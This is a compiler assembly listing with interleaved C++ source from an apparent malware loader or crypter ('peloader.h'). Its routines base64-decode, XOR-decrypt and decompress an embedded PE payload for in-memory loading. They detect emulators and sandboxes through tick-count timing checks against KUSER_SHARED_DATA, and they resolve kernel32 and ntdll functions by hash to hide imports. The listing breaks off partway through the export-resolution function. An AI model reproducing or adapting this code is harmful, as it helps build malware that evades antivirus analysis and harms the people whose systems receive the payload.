	mov	eax, DWORD PTR _lpReturnBuffer$[ebp]
	push	eax
	call	?base64Decode@@YAPAEPADKPAK@Z		; base64Decode
	add	esp, 12					; 0000000cH
	mov	DWORD PTR _lpReturnBuffer$[ebp], eax

; 861  : 	xor_encrypt_decrypt((char*)lpReturnBuffer, dwNewSize);

	mov	ecx, DWORD PTR _dwNewSize$[ebp]
	push	ecx
	mov	edx, DWORD PTR _lpReturnBuffer$[ebp]
	push	edx
	call	?xor_encrypt_decrypt@@YAXPADK@Z		; xor_encrypt_decrypt
	add	esp, 8

; 862  : 
; 863  : 	if (pSettings->bCompress) {

	mov	eax, DWORD PTR ?pSettings@@3PAUSettings@@A ; pSettings
	cmp	DWORD PTR [eax], 0
	je	SHORT $LN1@loader_loa

; 864  : 		lpReturnBuffer = DecompressData(lpReturnBuffer, dwNewSize, &dwXPressSize);

	lea	ecx, DWORD PTR _dwXPressSize$[ebp]
	push	ecx
	mov	edx, DWORD PTR _dwNewSize$[ebp]
	push	edx
	mov	eax, DWORD PTR _lpReturnBuffer$[ebp]
	push	eax
	call	?DecompressData@@YAPAXPAXKPAK@Z		; DecompressData
	add	esp, 12					; 0000000cH
	mov	DWORD PTR _lpReturnBuffer$[ebp], eax
$LN1@loader_loa:

; 865  : 	}
; 866  : 
; 867  : 	PIMAGE_DOS_HEADER pIDH = (PIMAGE_DOS_HEADER)lpReturnBuffer;

	mov	ecx, DWORD PTR _lpReturnBuffer$[ebp]
	mov	DWORD PTR _pIDH$[ebp], ecx

; 868  : 	PIMAGE_NT_HEADERS pINH = (PIMAGE_NT_HEADERS)((DWORD)lpReturnBuffer + pIDH->e_lfanew);

	mov	edx, DWORD PTR _pIDH$[ebp]
	mov	eax, DWORD PTR _lpReturnBuffer$[ebp]
	add	eax, DWORD PTR [edx+60]
	mov	DWORD PTR _pINH$[ebp], eax

; 869  : 	PIMAGE_SECTION_HEADER pLastSection = (PIMAGE_SECTION_HEADER)(((DWORD)lpReturnBuffer + pIDH->e_lfanew) + (0xF8 + ((pINH->FileHeader.NumberOfSections - 1) * 0x28)));

	mov	ecx, DWORD PTR _pIDH$[ebp]
	mov	edx, DWORD PTR _lpReturnBuffer$[ebp]
	add	edx, DWORD PTR [ecx+60]
	mov	eax, DWORD PTR _pINH$[ebp]
	movzx	ecx, WORD PTR [eax+6]
	sub	ecx, 1
	imul	eax, ecx, 40
	lea	ecx, DWORD PTR [edx+eax+248]
	mov	DWORD PTR _pLastSection$[ebp], ecx

; 870  : 
; 871  : 	*dwFileLenOut = pLastSection->PointerToRawData + pLastSection->SizeOfRawData; // Need a better way of calculating file size 

	mov	edx, DWORD PTR _pLastSection$[ebp]
	mov	eax, DWORD PTR [edx+20]
	mov	ecx, DWORD PTR _pLastSection$[ebp]
	add	eax, DWORD PTR [ecx+16]
	mov	edx, DWORD PTR _dwFileLenOut$[ebp]
	mov	DWORD PTR [edx], eax

; 872  : 
; 873  : 	return lpReturnBuffer;

	mov	eax, DWORD PTR _lpReturnBuffer$[ebp]

; 874  : }

	mov	esp, ebp
	pop	ebp
	ret	0
?loader_load_res@@YAPAXPAK@Z ENDP			; loader_load_res
_TEXT	ENDS
; Function compile flags: /Odtp
; File c:\users\admin\documents\visual studio 2013\projects\win32project1\win32project1\peloader.h
_TEXT	SEGMENT
tv70 = -4						; size = 4
?loader_init@@YA_NXZ PROC				; loader_init

; 781  : bool loader_init() {

	push	ebp
	mov	ebp, esp
	push	ecx

; 782  : 	return (load_kernel32() && load_ntdll());

	call	?load_kernel32@@YA_NXZ			; load_kernel32
	movzx	eax, al
	test	eax, eax
	je	SHORT $LN3@loader_ini
	call	?load_ntdll@@YA_NXZ			; load_ntdll
	movzx	ecx, al
	test	ecx, ecx
	je	SHORT $LN3@loader_ini
	mov	DWORD PTR tv70[ebp], 1
	jmp	SHORT $LN4@loader_ini
$LN3@loader_ini:
	mov	DWORD PTR tv70[ebp], 0
$LN4@loader_ini:
	mov	al, BYTE PTR tv70[ebp]

; 783  : }

	mov	esp, ebp
	pop	ebp
	ret	0
?loader_init@@YA_NXZ ENDP				; loader_init
_TEXT	ENDS
; Function compile flags: /Odtp
; File c:\users\admin\documents\visual studio 2013\projects\win32project1\win32project1\peloader.h
_TEXT	SEGMENT
_dwOrig2$ = -20						; size = 4
_dwNext2$ = -16						; size = 4
_dwOrig1$ = -12						; size = 4
_dwNext1$ = -8						; size = 4
_i$1 = -4						; size = 4
?checkEmulator_GetTickCount@@YA_NXZ PROC		; checkEmulator_GetTickCount

; 749  : bool checkEmulator_GetTickCount() {

	push	ebp
	mov	ebp, esp
	sub	esp, 20					; 00000014H
	push	ebx
	push	esi
	push	edi

; 750  : 
; 751  : 	ULONG dwOrig1 = InternalGetTickCount();

	call	?InternalGetTickCount@@YAKXZ		; InternalGetTickCount
	mov	DWORD PTR _dwOrig1$[ebp], eax

; 752  : 	ULONG dwOrig2 = InternalGetTickCount_WINAPI();

	call	?InternalGetTickCount_WINAPI@@YAKXZ	; InternalGetTickCount_WINAPI
	mov	DWORD PTR _dwOrig2$[ebp], eax

; 753  : 
; 754  : 	if (dwOrig1 != dwOrig2) {

	mov	eax, DWORD PTR _dwOrig1$[ebp]
	cmp	eax, DWORD PTR _dwOrig2$[ebp]
	je	SHORT $LN7@checkEmula

; 755  : 		return true;

	mov	al, 1
	jmp	SHORT $LN8@checkEmula
$LN7@checkEmula:

; 756  : 	}
; 757  : 
; 758  : 	for (size_t i = 0; i < 10000; i++) {

	mov	DWORD PTR _i$1[ebp], 0
	jmp	SHORT $LN6@checkEmula
$LN5@checkEmula:
	mov	ecx, DWORD PTR _i$1[ebp]
	add	ecx, 1
	mov	DWORD PTR _i$1[ebp], ecx
$LN6@checkEmula:
	cmp	DWORD PTR _i$1[ebp], 10000		; 00002710H
	jae	SHORT $LN4@checkEmula

; 759  : 		__asm{ pushad }

	pushad

; 760  : 		//		emul_func_loop();
; 761  : 		__asm { popad }

	popad

; 762  : 	}

	jmp	SHORT $LN5@checkEmula
$LN4@checkEmula:

; 763  : 
; 764  : 	ULONG dwNext1 = InternalGetTickCount();

	call	?InternalGetTickCount@@YAKXZ		; InternalGetTickCount
	mov	DWORD PTR _dwNext1$[ebp], eax

; 765  : 	ULONG dwNext2 = InternalGetTickCount_WINAPI();

	call	?InternalGetTickCount_WINAPI@@YAKXZ	; InternalGetTickCount_WINAPI
	mov	DWORD PTR _dwNext2$[ebp], eax

; 766  : 
; 767  : 	if (dwNext1 != dwNext2) {

	mov	edx, DWORD PTR _dwNext1$[ebp]
	cmp	edx, DWORD PTR _dwNext2$[ebp]
	je	SHORT $LN3@checkEmula

; 768  : 		return true;

	mov	al, 1
	jmp	SHORT $LN8@checkEmula
$LN3@checkEmula:

; 769  : 	}
; 770  : 
; 771  : 	if (dwNext1 - dwOrig1 > 2000)

	mov	eax, DWORD PTR _dwNext1$[ebp]
	sub	eax, DWORD PTR _dwOrig1$[ebp]
	cmp	eax, 2000				; 000007d0H
	jbe	SHORT $LN2@checkEmula

; 772  : 		return true;

	mov	al, 1
	jmp	SHORT $LN8@checkEmula
$LN2@checkEmula:

; 773  : 
; 774  : 	if (dwNext2 - dwOrig2 > 2000)

	mov	ecx, DWORD PTR _dwNext2$[ebp]
	sub	ecx, DWORD PTR _dwOrig2$[ebp]
	cmp	ecx, 2000				; 000007d0H
	jbe	SHORT $LN1@checkEmula

; 775  : 		return true;

	mov	al, 1
	jmp	SHORT $LN8@checkEmula
$LN1@checkEmula:

; 776  : 
; 777  : 	return false;

	xor	al, al
$LN8@checkEmula:

; 778  : }

	pop	edi
	pop	esi
	pop	ebx
	mov	esp, ebp
	pop	ebp
	ret	0
?checkEmulator_GetTickCount@@YA_NXZ ENDP		; checkEmulator_GetTickCount
_TEXT	ENDS
; Function compile flags: /Odtp
; File c:\users\admin\documents\visual studio 2013\projects\win32project1\win32project1\peloader.h
_TEXT	SEGMENT
_lpGetTickCount$ = -8					; size = 4
_dwTickCount$ = -4					; size = 4
?InternalGetTickCount_WINAPI@@YAKXZ PROC		; InternalGetTickCount_WINAPI

; 734  : ULONG InternalGetTickCount_WINAPI() {

	push	ebp
	mov	ebp, esp
	sub	esp, 8

; 735  : 
; 736  : 	ULONG dwTickCount = 0;

	mov	DWORD PTR _dwTickCount$[ebp], 0

; 737  : 
; 738  : 	LPVOID lpGetTickCount = load_func(MODULE_BASE::KERNEL32, hash_GetTickCount);

	mov	eax, DWORD PTR ?hash_GetTickCount@@3KC	; hash_GetTickCount
	push	eax
	push	1
	call	?load_func@@YAPAXW4MODULE_BASE@@K@Z	; load_func
	add	esp, 8
	mov	DWORD PTR _lpGetTickCount$[ebp], eax

; 739  : 
; 740  : 	__asm{
; 741  : 		mov eax, lpGetTickCount

	mov	eax, DWORD PTR _lpGetTickCount$[ebp]

; 742  : 			call eax

	call	eax

; 743  : 			mov dwTickCount, eax

	mov	DWORD PTR _dwTickCount$[ebp], eax

; 744  : 	}
; 745  : 
; 746  : 	return dwTickCount;

	mov	eax, DWORD PTR _dwTickCount$[ebp]

; 747  : }

	mov	esp, ebp
	pop	ebp
	ret	0
?InternalGetTickCount_WINAPI@@YAKXZ ENDP		; InternalGetTickCount_WINAPI
_TEXT	ENDS
; Function compile flags: /Odtp
; File c:\users\admin\documents\visual studio 2013\projects\win32project1\win32project1\peloader.h
_TEXT	SEGMENT
_TickCount$ = -20					; size = 8
_tick2$ = -12						; size = 4
_tick1$ = -8						; size = 4
_SharedUserData$ = -4					; size = 4
?InternalGetTickCount@@YAKXZ PROC			; InternalGetTickCount

; 712  : ULONG InternalGetTickCount() {

	push	ebp
	mov	ebp, esp
	sub	esp, 20					; 00000014H

; 713  : 
; 714  : 	PKUSER_SHARED_DATA SharedUserData = (PKUSER_SHARED_DATA)MM_SHARED_USER_DATA_VA;

	mov	DWORD PTR _SharedUserData$[ebp], 2147352576 ; 7ffe0000H
$LN3@InternalGe:

; 715  : 
; 716  : 	ULARGE_INTEGER TickCount;
; 717  : 
; 718  : 	while (TRUE) {

	mov	eax, 1
	test	eax, eax
	je	SHORT $LN2@InternalGe

; 719  : 		TickCount.HighPart = (ULONG)SharedUserData->TickCount.High1Time;

	mov	ecx, DWORD PTR _SharedUserData$[ebp]
	mov	edx, DWORD PTR [ecx+804]
	mov	DWORD PTR _TickCount$[ebp+4], edx

; 720  : 		TickCount.LowPart = SharedUserData->TickCount.LowPart;

	mov	eax, DWORD PTR _SharedUserData$[ebp]
	mov	ecx, DWORD PTR [eax+800]
	mov	DWORD PTR _TickCount$[ebp], ecx

; 721  : 
; 722  : 		if (TickCount.HighPart == (ULONG)SharedUserData->TickCount.High2Time)

	mov	edx, DWORD PTR _SharedUserData$[ebp]
	mov	eax, DWORD PTR _TickCount$[ebp+4]
	cmp	eax, DWORD PTR [edx+808]
	jne	SHORT $LN1@InternalGe

; 723  : 			break;

	jmp	SHORT $LN2@InternalGe
$LN1@InternalGe:

; 724  : 
; 725  : 		YieldProcessor();

	pause

; 726  : 	}

	jmp	SHORT $LN3@InternalGe
$LN2@InternalGe:

; 727  : 
; 728  : 	ULONG tick1 = ((unsigned __int64)(unsigned int)(TickCount.LowPart)*(unsigned __int64)(unsigned int)(SharedUserData->TickCountMultiplier) >> 24);

	mov	ecx, DWORD PTR _SharedUserData$[ebp]
	mov	eax, DWORD PTR _TickCount$[ebp]
	mul	DWORD PTR [ecx+4]
	mov	cl, 24					; 00000018H
	call	__aullshr
	mov	DWORD PTR _tick1$[ebp], eax

; 729  : 	ULONG tick2 = ((unsigned __int64)(unsigned int)((TickCount.HighPart << 8) & 0xFFFFFFFF)*(unsigned __int64)(unsigned int)(SharedUserData->TickCountMultiplier));

	mov	eax, DWORD PTR _TickCount$[ebp+4]
	shl	eax, 8
	mov	edx, DWORD PTR _SharedUserData$[ebp]
	mul	DWORD PTR [edx+4]
	mov	DWORD PTR _tick2$[ebp], eax

; 730  : 
; 731  : 	return tick1 + tick2;

	mov	eax, DWORD PTR _tick1$[ebp]
	add	eax, DWORD PTR _tick2$[ebp]

; 732  : }

	mov	esp, ebp
	pop	ebp
	ret	0
?InternalGetTickCount@@YAKXZ ENDP			; InternalGetTickCount
_TEXT	ENDS
; Function compile flags: /Odtp
; File c:\users\admin\documents\visual studio 2013\projects\win32project1\win32project1\peloader.h
_TEXT	SEGMENT
_lpDecompressed$ = -4					; size = 4
_lpCompressedBuffer$ = 8				; size = 4
_dwCompressedSize$ = 12					; size = 4
_dwUnCompressedSize$ = 16				; size = 4
?DecompressData@@YAPAXPAXKPAK@Z PROC			; DecompressData

; 698  : void* DecompressData(void* lpCompressedBuffer, DWORD dwCompressedSize, DWORD* dwUnCompressedSize) {

	push	ebp
	mov	ebp, esp
	push	ecx

; 699  : 
; 700  : 	void* lpDecompressed = x_VirtualAlloc(NULL, dwCompressedSize * 10, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	push	4
	push	12288					; 00003000H
	imul	eax, DWORD PTR _dwCompressedSize$[ebp], 10
	push	eax
	push	0
	call	DWORD PTR ?x_VirtualAlloc@@3P6GPAXPAXKKK@ZA ; x_VirtualAlloc
	mov	DWORD PTR _lpDecompressed$[ebp], eax

; 701  : 
; 702  : 	//x_RtlGetCompressionWorkSpaceSize = reinterpret_cast<API_DEFINES::t_RtlGetCompressionWorkSpaceSize>(load_func(MODULE_BASE::NTDLL, hash_RtlGetCompressionWorkSpaceSize));
; 703  : 	x_RtlDecompressBuffer = reinterpret_cast<API_DEFINES::t_RtlDecompressBuffer>(load_func(MODULE_BASE::NTDLL, hash_RtlDecompressBuffer));

	mov	ecx, DWORD PTR ?hash_RtlDecompressBuffer@@3KC ; hash_RtlDecompressBuffer
	push	ecx
	push	0
	call	?load_func@@YAPAXW4MODULE_BASE@@K@Z	; load_func
	add	esp, 8
	mov	DWORD PTR ?x_RtlDecompressBuffer@@3P6GJKPAXK0KPAK@ZA, eax ; x_RtlDecompressBuffer

; 704  : 
; 705  : 	// x_RtlDecompressBuffer(0x02 | 0x0100, lpCompressedBuffer, dwSize, lpCompressedBuffer, dwSize, &(*dwUnCompressedSize));
; 706  : 	x_RtlDecompressBuffer(0x02, lpDecompressed, dwCompressedSize * 10, lpCompressedBuffer, dwCompressedSize, &(*dwUnCompressedSize));

	mov	edx, DWORD PTR _dwUnCompressedSize$[ebp]
	push	edx
	mov	eax, DWORD PTR _dwCompressedSize$[ebp]
	push	eax
	mov	ecx, DWORD PTR _lpCompressedBuffer$[ebp]
	push	ecx
	imul	edx, DWORD PTR _dwCompressedSize$[ebp], 10
	push	edx
	mov	eax, DWORD PTR _lpDecompressed$[ebp]
	push	eax
	push	2
	call	DWORD PTR ?x_RtlDecompressBuffer@@3P6GJKPAXK0KPAK@ZA ; x_RtlDecompressBuffer

; 707  : 	return lpDecompressed;

	mov	eax, DWORD PTR _lpDecompressed$[ebp]

; 708  : }

	mov	esp, ebp
	pop	ebp
	ret	0
?DecompressData@@YAPAXPAXKPAK@Z ENDP			; DecompressData
_TEXT	ENDS
; Function compile flags: /Odtp
; File c:\users\admin\documents\visual studio 2013\projects\win32project1\win32project1\peloader.h
_TEXT	SEGMENT
_i$1 = -4						; size = 4
_lpData$ = 8						; size = 4
_dwLen$ = 12						; size = 4
?xor_encrypt_decrypt@@YAXPADK@Z PROC			; xor_encrypt_decrypt

; 692  : void xor_encrypt_decrypt(char* lpData, DWORD dwLen) {

	push	ebp
	mov	ebp, esp
	push	ecx

; 693  : 	for (DWORD i = 0; i < dwLen; i++) {

	mov	DWORD PTR _i$1[ebp], 0
	jmp	SHORT $LN3@xor_encryp
$LN2@xor_encryp:
	mov	eax, DWORD PTR _i$1[ebp]
	add	eax, 1
	mov	DWORD PTR _i$1[ebp], eax
$LN3@xor_encryp:
	mov	ecx, DWORD PTR _i$1[ebp]
	cmp	ecx, DWORD PTR _dwLen$[ebp]
	jae	SHORT $LN4@xor_encryp

; 694  : 		lpData[i] ^= lpKey[i % KEY_SIZE];

	mov	eax, DWORD PTR _i$1[ebp]
	xor	edx, edx
	mov	ecx, 256				; 00000100H
	div	ecx
	mov	dl, BYTE PTR ?lpKey@@3RCDC[edx]
	movsx	eax, dl
	mov	ecx, DWORD PTR _lpData$[ebp]
	add	ecx, DWORD PTR _i$1[ebp]
	movsx	edx, BYTE PTR [ecx]
	xor	edx, eax
	mov	eax, DWORD PTR _lpData$[ebp]
	add	eax, DWORD PTR _i$1[ebp]
	mov	BYTE PTR [eax], dl

; 695  : 	}

	jmp	SHORT $LN2@xor_encryp
$LN4@xor_encryp:

; 696  : }

	mov	esp, ebp
	pop	ebp
	ret	0
?xor_encrypt_decrypt@@YAXPADK@Z ENDP			; xor_encrypt_decrypt
_TEXT	ENDS
; Function compile flags: /Odtp
; File c:\users\admin\documents\visual studio 2013\projects\win32project1\win32project1\peloader.h
_TEXT	SEGMENT
_cd64$ = -132						; size = 81
_dwMemSize$ = -48					; size = 4
tv135 = -44						; size = 4
tv95 = -40						; size = 4
_e$1 = -36						; size = 4
_dest$ = -32						; size = 4
_len$2 = -28						; size = 4
_out$3 = -24						; size = 3
_r$4 = -20						; size = 4
_in$5 = -16						; size = 4
_p$6 = -12						; size = 4
_i$7 = -8						; size = 4
_v$8 = -1						; size = 1
_source$ = 8						; size = 4
_sourceSize$ = 12					; size = 4
_destSize$ = 16						; size = 4
?base64Decode@@YAPAEPADKPAK@Z PROC			; base64Decode

; 649  : LPBYTE base64Decode(LPSTR source, SIZE_T sourceSize, SIZE_T *destSize) {

	push	ebp
	mov	ebp, esp
	sub	esp, 132				; 00000084H
	push	esi
	push	edi

; 650  : 
; 651  : 	char cd64[] = "|$$$}rstuvwxyz{$$$$$$$>?@ABCDEFGHIJKLMNOPQRSTUVW$$$$$$XYZ[\\]^_`abcdefghijklmnopq";

	mov	ecx, 20					; 00000014H
	mov	esi, OFFSET $SG31906
	lea	edi, DWORD PTR _cd64$[ebp]
	rep movsd
	movsb

; 652  : 	DWORD dwMemSize = sourceSize + sizeof(BYTE);

	mov	eax, DWORD PTR _sourceSize$[ebp]
	add	eax, 1
	mov	DWORD PTR _dwMemSize$[ebp], eax

; 653  : 	LPBYTE dest = (LPBYTE)x_VirtualAlloc(NULL, sourceSize + sizeof(BYTE), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	push	4
	push	12288					; 00003000H
	mov	ecx, DWORD PTR _sourceSize$[ebp]
	add	ecx, 1
	push	ecx
	push	0
	call	DWORD PTR ?x_VirtualAlloc@@3P6GPAXPAXKKK@ZA ; x_VirtualAlloc
	mov	DWORD PTR _dest$[ebp], eax

; 654  : 
; 655  : 	if (dest != NULL) {

	cmp	DWORD PTR _dest$[ebp], 0
	je	$LN16@base64Deco

; 656  : 		LPBYTE p = (LPBYTE)source;

	mov	edx, DWORD PTR _source$[ebp]
	mov	DWORD PTR _p$6[ebp], edx

; 657  : 		LPBYTE e = p + sourceSize;

	mov	eax, DWORD PTR _p$6[ebp]
	add	eax, DWORD PTR _sourceSize$[ebp]
	mov	DWORD PTR _e$1[ebp], eax

; 658  : 		LPBYTE r = (LPBYTE)dest;

	mov	ecx, DWORD PTR _dest$[ebp]
	mov	DWORD PTR _r$4[ebp], ecx
$LN15@base64Deco:

; 659  : 
; 660  : 		BYTE in[4], out[3], v;
; 661  : 		int len, i;
; 662  : 
; 663  : 		while (p < e) {

	mov	edx, DWORD PTR _p$6[ebp]
	cmp	edx, DWORD PTR _e$1[ebp]
	jae	$LN14@base64Deco

; 664  : 			for (len = 0, i = 0; i < 4 && p < e; i++) {

	mov	DWORD PTR _len$2[ebp], 0
	mov	DWORD PTR _i$7[ebp], 0
	jmp	SHORT $LN13@base64Deco
$LN12@base64Deco:
	mov	eax, DWORD PTR _i$7[ebp]
	add	eax, 1
	mov	DWORD PTR _i$7[ebp], eax
$LN13@base64Deco:
	cmp	DWORD PTR _i$7[ebp], 4
	jge	$LN11@base64Deco
	mov	ecx, DWORD PTR _p$6[ebp]
	cmp	ecx, DWORD PTR _e$1[ebp]
	jae	$LN11@base64Deco

; 665  : 				v = 0;

	mov	BYTE PTR _v$8[ebp], 0
$LN10@base64Deco:

; 666  : 				while (p < e && v == 0) {

	mov	edx, DWORD PTR _p$6[ebp]
	cmp	edx, DWORD PTR _e$1[ebp]
	jae	SHORT $LN9@base64Deco
	movzx	eax, BYTE PTR _v$8[ebp]
	test	eax, eax
	jne	SHORT $LN9@base64Deco

; 667  : 					v = (BYTE)*(p++);

	mov	ecx, DWORD PTR _p$6[ebp]
	mov	dl, BYTE PTR [ecx]
	mov	BYTE PTR _v$8[ebp], dl
	mov	eax, DWORD PTR _p$6[ebp]
	add	eax, 1
	mov	DWORD PTR _p$6[ebp], eax

; 668  : 					v = (BYTE)((v < 43 || v > 122) ? 0 : cd64[v - 43]);

	movzx	ecx, BYTE PTR _v$8[ebp]
	cmp	ecx, 43					; 0000002bH
	jl	SHORT $LN19@base64Deco
	movzx	edx, BYTE PTR _v$8[ebp]
	cmp	edx, 122				; 0000007aH
	jg	SHORT $LN19@base64Deco
	movzx	eax, BYTE PTR _v$8[ebp]
	movsx	ecx, BYTE PTR _cd64$[ebp+eax-43]
	mov	DWORD PTR tv95[ebp], ecx
	jmp	SHORT $LN20@base64Deco
$LN19@base64Deco:
	mov	DWORD PTR tv95[ebp], 0
$LN20@base64Deco:
	mov	dl, BYTE PTR tv95[ebp]
	mov	BYTE PTR _v$8[ebp], dl

; 669  : 					if (v != 0)v = (BYTE)((v == '$') ? 0 : v - 61);

	movzx	eax, BYTE PTR _v$8[ebp]
	test	eax, eax
	je	SHORT $LN8@base64Deco
	movzx	ecx, BYTE PTR _v$8[ebp]
	cmp	ecx, 36					; 00000024H
	jne	SHORT $LN21@base64Deco
	mov	DWORD PTR tv135[ebp], 0
	jmp	SHORT $LN22@base64Deco
$LN21@base64Deco:
	movzx	edx, BYTE PTR _v$8[ebp]
	sub	edx, 61					; 0000003dH
	mov	DWORD PTR tv135[ebp], edx
$LN22@base64Deco:
	mov	al, BYTE PTR tv135[ebp]
	mov	BYTE PTR _v$8[ebp], al
$LN8@base64Deco:

; 670  : 				}

	jmp	SHORT $LN10@base64Deco
$LN9@base64Deco:

; 671  : 
; 672  : 				if (v != 0) {

	movzx	ecx, BYTE PTR _v$8[ebp]
	test	ecx, ecx
	je	SHORT $LN7@base64Deco

; 673  : 					len++;

	mov	edx, DWORD PTR _len$2[ebp]
	add	edx, 1
	mov	DWORD PTR _len$2[ebp], edx

; 674  : 					in[i] = (BYTE)(v - 1);

	movzx	eax, BYTE PTR _v$8[ebp]
	sub	eax, 1
	mov	ecx, DWORD PTR _i$7[ebp]
	mov	BYTE PTR _in$5[ebp+ecx], al
$LN7@base64Deco:

; 675  : 				}
; 676  : 			}

	jmp	$LN12@base64Deco
$LN11@base64Deco:

; 677  : 
; 678  : 			if (len) {

	cmp	DWORD PTR _len$2[ebp], 0
	je	$LN6@base64Deco

; 679  : 				out[0] = (BYTE)(in[0] << 2 | in[1] >> 4);

	mov	edx, 1
	imul	eax, edx, 0
	movzx	ecx, BYTE PTR _in$5[ebp+eax]
	shl	ecx, 2
	mov	edx, 1
	shl	edx, 0
	movzx	eax, BYTE PTR _in$5[ebp+edx]
	sar	eax, 4
	or	ecx, eax
	mov	edx, 1
	imul	eax, edx, 0
	mov	BYTE PTR _out$3[ebp+eax], cl

; 680  : 				out[1] = (BYTE)(in[1] << 4 | in[2] >> 2);

	mov	ecx, 1
	shl	ecx, 0
	movzx	edx, BYTE PTR _in$5[ebp+ecx]
	shl	edx, 4
	mov	eax, 1
	shl	eax, 1
	movzx	ecx, BYTE PTR _in$5[ebp+eax]
	sar	ecx, 2
	or	edx, ecx
	mov	eax, 1
	shl	eax, 0
	mov	BYTE PTR _out$3[ebp+eax], dl

; 681  : 				out[2] = (BYTE)(((in[2] << 6) & 0xC0) | in[3]);

	mov	ecx, 1
	shl	ecx, 1
	movzx	edx, BYTE PTR _in$5[ebp+ecx]
	shl	edx, 6
	and	edx, 192				; 000000c0H
	mov	eax, 1
	imul	ecx, eax, 3
	movzx	eax, BYTE PTR _in$5[ebp+ecx]
	or	edx, eax
	mov	ecx, 1
	shl	ecx, 1
	mov	BYTE PTR _out$3[ebp+ecx], dl

; 682  : 				for (i = 0; i < len - 1; i++) { *(r++) = out[i]; if (i == 0)i = 0; }

	mov	DWORD PTR _i$7[ebp], 0
	jmp	SHORT $LN5@base64Deco
$LN4@base64Deco:
	mov	edx, DWORD PTR _i$7[ebp]
	add	edx, 1
	mov	DWORD PTR _i$7[ebp], edx
$LN5@base64Deco:
	mov	eax, DWORD PTR _len$2[ebp]
	sub	eax, 1
	cmp	DWORD PTR _i$7[ebp], eax
	jge	SHORT $LN6@base64Deco
	mov	ecx, DWORD PTR _r$4[ebp]
	mov	edx, DWORD PTR _i$7[ebp]
	mov	al, BYTE PTR _out$3[ebp+edx]
	mov	BYTE PTR [ecx], al
	mov	ecx, DWORD PTR _r$4[ebp]
	add	ecx, 1
	mov	DWORD PTR _r$4[ebp], ecx
	cmp	DWORD PTR _i$7[ebp], 0
	jne	SHORT $LN2@base64Deco
	mov	DWORD PTR _i$7[ebp], 0
$LN2@base64Deco:
	jmp	SHORT $LN4@base64Deco
$LN6@base64Deco:

; 683  : 			}
; 684  : 		}

	jmp	$LN15@base64Deco
$LN14@base64Deco:

; 685  : 		*r = 0;

	mov	edx, DWORD PTR _r$4[ebp]
	mov	BYTE PTR [edx], 0

; 686  : 		if (destSize)*destSize = (SIZE_T)(r - dest);

	cmp	DWORD PTR _destSize$[ebp], 0
	je	SHORT $LN16@base64Deco
	mov	eax, DWORD PTR _r$4[ebp]
	sub	eax, DWORD PTR _dest$[ebp]
	mov	ecx, DWORD PTR _destSize$[ebp]
	mov	DWORD PTR [ecx], eax
$LN16@base64Deco:

; 687  : 	}
; 688  : 
; 689  : 	return dest;

	mov	eax, DWORD PTR _dest$[ebp]

; 690  : }

	pop	edi
	pop	esi
	mov	esp, ebp
	pop	ebp
	ret	0
?base64Decode@@YAPAEPADKPAK@Z ENDP			; base64Decode
_TEXT	ENDS
; Function compile flags: /Odtp
; File c:\users\admin\documents\visual studio 2013\projects\win32project1\win32project1\peloader.h
_TEXT	SEGMENT
_addrFunctions$ = -44					; size = 4
_addrNameOrdinals$ = -40				; size = 4
_elfHash$1 = -36					; size = 4
_addrNames$ = -32					; size = 4
_pINH$ = -28						; size = 4
_pIDH$ = -24						; size = 4
_pszFunctionName$2 = -20				; size = 4
tv64 = -16						; size = 4
_pIED$ = -12						; size = 4
_i$3 = -8						; size = 4
_lpModuleBase$ = -4					; size = 4
_modBase$ = 8						; size = 4
_dwFuncHash$ = 12					; size = 4
?load_func@@YAPAXW4MODULE_BASE@@K@Z PROC		; load_func

; 614  : LPVOID load_func(MODULE_BASE modBase, DWORD dwFuncHash) {

	push	ebp
	mov	ebp, esp
	sub	esp, 44					; 0000002cH

; 615  : 
; 616  : 	LPVOID lpModuleBase = NULL;

	mov	DWORD PTR _lpModuleBase$[ebp], 0

; 617  : 
; 618  : 	switch (modBase) {

	mov	eax, DWORD PTR _modBase$[ebp]
	mov	DWORD PTR tv64[ebp], eax
	cmp	DWORD PTR tv64[ebp], 0
	je	SHORT $LN6@load_func
	cmp	DWORD PTR tv64[ebp], 1
	je	SHORT $LN5@load_func
	jmp	SHORT $LN7@load_func
$LN6@load_func:

; 619  : 		case NTDLL:
; 620  : 			lpModuleBase = NTDLL_BASE_ADDRESS;

	mov	ecx, DWORD PTR ?NTDLL_BASE_ADDRESS@@3PAXA ; NTDLL_BASE_ADDRESS
	mov	DWORD PTR _lpModuleBase$[ebp], ecx

; 621  : 			break;

	jmp	SHORT $LN7@load_func
$LN5@load_func:

; 622  : 		case KERNEL32:
; 623  : 			lpModuleBase = KERNEL32_BASE_ADDRESS;

	mov	edx, DWORD PTR ?KERNEL32_BASE_ADDRESS@@3PAXA ; KERNEL32_BASE_ADDRESS
	mov	DWORD PTR _lpModuleBase$[ebp], edx
$LN7@load_func:

; 624  : 			break;
; 625  : 	}
; 626  : 
; 627  : 	PIMAGE_DOS_HEADER pIDH = (PIMAGE_DOS_HEADER)lpModuleBase;

	mov	eax, DWORD PTR _lpModuleBase$[ebp]
	mov	DWORD PTR _pIDH$[ebp], eax

; 628  : 	PIMAGE_NT_HEADERS pINH = (PIMAGE_NT_HEADERS)((DWORD)lpModuleBase + pIDH->e_lfanew);

	mov	ecx, DWORD PTR _pIDH$[ebp]
	mov	edx, DWORD PTR _lpModuleBase$[ebp]
	add	edx, DWORD PTR [ecx+60]
	mov	DWORD PTR _pINH$[ebp], edx

; 629  : 
; 630  : 	PIMAGE_EXPORT_DIRECTORY pIED = (PIMAGE_EXPORT_DIRECTORY)((DWORD)lpModuleBase + pINH->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

	mov	eax, 8
	imul	ecx, eax, 0
	mov	edx, DWORD PTR _pINH$[ebp]
	mov	eax, DWORD PTR _lpModuleBase$[ebp]
	add	eax, DWORD PTR [edx+ecx+120]
	mov	DWORD PTR _pIED$[ebp], eax

; 631  : 
; 632  : 	LPVOID* addrFunctions = (LPVOID*)((DWORD)lpModuleBase + pIED->AddressOfFunctions);

	mov	ecx, DWORD PTR _pIED$[ebp]
	mov	edx, DWORD PTR _lpModuleBase$[ebp]
	add	edx, DWORD PTR [ecx+28]
	mov	DWORD PTR _addrFunctions$[ebp], edx

; 633  : 	char** addrNames = (char**)((DWORD)lpModuleBase + pIED->AddressOfNames);

	mov	eax, DWORD PTR _pIED$[ebp]
	mov	ecx, DWORD PTR _lpModuleBase$[ebp]
	add	ecx, DWORD PTR [eax+32]
